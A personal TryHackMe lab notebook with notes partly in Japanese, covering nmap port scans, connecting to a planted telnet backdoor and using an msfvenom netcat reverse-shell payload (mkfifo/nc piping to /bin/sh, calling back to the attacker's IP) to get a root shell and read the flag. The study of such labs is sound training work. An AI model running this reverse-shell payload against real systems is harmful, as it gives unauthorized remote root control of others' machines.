### scan global ip addr on linux/mac
```
curl ifconfig.me
```

### Scan for open ports
#### nmap -Pn -sS -T4 -p 8000-9000 10.10.14.203
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ sudo nmap -Pn -sS -T4 -p 8000-9000 10.10.14.203
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 22:48 JST
Nmap scan report for 10.10.14.203
Host is up (0.50s latency).
Not shown: 1000 closed tcp ports (reset)
PORT     STATE SERVICE
8012/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.91 seconds
```
#### nmap -Pn -sS -T4 -p 8000-8020 10.10.230.53 -v
```
┌──(yuu㉿kali)-[~]
└─$ sudo nmap -Pn -sS -T4 -p 8000-8020 10.10.230.53 -v
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 03:22 JST
Initiating Parallel DNS resolution of 1 host. at 03:22
Completed Parallel DNS resolution of 1 host. at 03:22, 0.07s elapsed
Initiating SYN Stealth Scan at 03:22
Scanning 10.10.230.53 [21 ports]
Discovered open port 8012/tcp on 10.10.230.53
Increasing send delay for 10.10.230.53 from 0 to 5 due to 11 out of 22 dropped probes since last increase.
Completed SYN Stealth Scan at 03:22, 4.42s elapsed (21 total ports)
Nmap scan report for 10.10.230.53
Host is up (0.44s latency).

PORT     STATE  SERVICE
8000/tcp closed http-alt
8001/tcp closed vcom-tunnel
8002/tcp closed teradataordbms
8003/tcp closed mcreport
8004/tcp closed p2pevolvenet
8005/tcp closed mxi
8006/tcp closed wpl-analytics
8007/tcp closed ajp12
8008/tcp closed http
8009/tcp closed ajp13
8010/tcp closed xmpp
8011/tcp closed unknown
8012/tcp open   unknown
8013/tcp closed unknown
8014/tcp closed unknown
8015/tcp closed cfg-cloud
8016/tcp closed ads-s
8017/tcp closed cisco-cloudsec
8018/tcp closed unknown
8019/tcp closed qbdb
8020/tcp closed intu-ec-svcdisc

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.55 seconds
           Raw packets sent: 51 (2.244KB) | Rcvd: 31 (1.248KB)
```

### telnet
#### terminal 1
```
┌──(yuu㉿kali)-[~]
└─$ telnet 10.10.77.197 8012
Trying 10.10.77.197...
Connected to 10.10.77.197.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.RUN ping -c 1 10.4.109.58
```
#### terminal 2
```
┌──(yuu㉿kali)-[~]
└─$ sudo tcpdump ip proto \\icmp -i tun0
[sudo] password for yuu:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:08:11.455978 IP 10.10.77.197 > 10.4.109.58: ICMP echo request, id 1246, seq 1, length 64
04:08:11.456034 IP 10.4.109.58 > 10.10.77.197: ICMP echo reply, id 1246, seq 1, length 64
```

### nc (netcat)
TCP/UDPプロトコルを使用してネットワーク接続を読み書きする。
#### option for nc command
-n: DNS名前解決を行わない（IPアドレスを名前に変換しない）
接続が高速になり、不要なDNSルックアップを避ける

-v: verbose（詳細）モード
より詳細な情報を表示する

#### Establish a reverse shell from the victim machine to the host PC
```
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ nc -nv 10.10.14.203 8012
(UNKNOWN) [10.10.14.203] 8012 (?) open
SKIDY'S BACKDOOR. Type .HELP to view commands
```

```# Terminal 1
┌──(yuu㉿kali)-[~/vpn]
└─$ sudo nmap -Pn -sS -T4 -p 8000-8030 10.10.141.154
[sudo] password for yuu:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 05:45 JST
Nmap scan report for 10.10.141.154
Host is up (0.32s latency).
Not shown: 30 closed tcp ports (reset)
PORT     STATE SERVICE
8012/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.17.21.16 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 97 bytes
mkfifo /tmp/nughpg; nc 10.17.21.16 4444 0</tmp/nughpg | /bin/sh >/tmp/nughpg 2>&1; rm /tmp/nughpg

┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ nc -lvp 4444
listening on [any] 4444 ...
10.10.141.154: inverse host lookup failed: Unknown host
connect to [10.17.21.16] from (UNKNOWN) [10.10.141.154] 46822
```

```# Terminal 2
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ telnet 10.10.141.154 8012
Trying 10.10.141.154...
Connected to 10.10.141.154.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.RUN mkfifo /tmp/nughpg; nc 10.17.21.16 4444 0</tmp/nughpg | /bin/sh >/tmp/nughpg 2>&1; rm /tmp/nughpg

```

```# Terminal 1
┌──(yuu㉿kali)-[~/TryHackMe/test]
└─$ nc -lvp 4444
listening on [any] 4444 ...
10.10.141.154: inverse host lookup failed: Unknown host
connect to [10.17.21.16] from (UNKNOWN) [10.10.141.154] 46822
whoami
root
ls -laF /root
total 40
drwx------  6 root root 4096 Apr 20  2020 ./
drwxr-xr-x 23 root root 4096 Apr 19  2020 ../
-rw-------  1 root root    0 Apr 20  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 19  2020 .cache/
-rw-r--r--  1 root root   29 Apr 20  2020 flag.txt
drwx------  3 root root 4096 Apr 19  2020 .gnupg/
drwxr-xr-x  3 root root 4096 Jun  7  2018 .local/
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Jun  7  2018 .selected_editor
drwx------  2 root root 4096 Jun  7  2018 .ssh/
-rw-------  1 root root    0 Apr 20  2020 .viminfo
cat /root/flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g}
```
